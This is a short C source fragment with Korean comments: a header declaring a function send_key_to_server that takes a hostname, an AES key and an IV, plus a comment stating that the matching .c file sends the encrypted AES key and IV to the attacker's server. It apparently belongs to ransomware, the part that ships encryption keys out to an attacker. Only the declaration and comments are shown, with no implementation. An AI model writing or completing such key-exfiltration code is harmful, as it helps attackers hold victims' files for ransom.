// key_sender.h - 키 전송용 헤더

#ifndef KEY_SENDER_H
#define KEY_SENDER_H

int send_key_to_server(const char* hostname, const unsigned char* key, const unsigned char* iv);

#endif // KEY_SENDER_H
// key_sender.c - 암호화된 AES 키/IV를 공격자 서버로 전송
